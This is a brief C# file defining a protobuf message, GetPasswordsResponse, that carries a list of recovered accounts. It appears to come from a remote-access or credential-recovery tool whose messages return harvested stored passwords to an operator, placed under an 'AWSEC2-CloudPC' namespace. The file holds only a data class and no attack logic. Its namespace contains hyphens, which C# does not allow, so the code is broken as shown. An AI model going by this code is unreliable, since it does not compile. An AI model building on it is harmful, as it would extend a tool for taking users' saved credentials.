using ProtoBuf;
using AWSEC2-CloudPC.Common.Models;
using System.Collections.Generic;

namespace AWSEC2-CloudPC.Common.Messages
{
    [ProtoContract]
    public class GetPasswordsResponse : IMessage
    {
        [ProtoMember(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }
    }
}
